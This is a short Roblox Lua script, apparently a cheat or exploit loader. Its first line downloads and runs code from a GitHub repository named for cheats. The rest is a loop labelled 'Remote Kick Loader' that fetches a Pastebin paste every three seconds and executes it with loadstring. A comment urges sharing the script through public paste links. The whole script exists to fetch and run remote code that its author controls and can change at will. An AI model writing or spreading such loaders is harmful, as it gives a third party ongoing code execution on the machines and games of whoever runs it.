loadstring(game:HttpGet("https://raw.githubusercontent.com/RealICheats/ICheatM/refs/heads/main/Script.lua", true))()

-- Remote Kick Loader - always fetches fresh paste every ~3 seconds
-- Put THIS in your public paste / share link

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer

local KICK_URL = "https://pastebin.com/NmZAr6zi"  -- change this

while true do
    local success, code = pcall(function()
        return HttpService:GetAsync(KICK_URL, true)
    end)
    
    if success and code and code ~= "" then
        local fn, err = loadstring(code)
        if fn then
            local ok, kickErr = pcall(fn)
            if not ok then
                warn("Kick script error: " .. tostring(kickErr))
            end
        else
            warn("Loadstring failed: " .. tostring(err))
        end
    else
        warn("Failed to fetch kick script")
    end
    
    task.wait(3)  -- adjust delay (2–5s is usually safe)
end
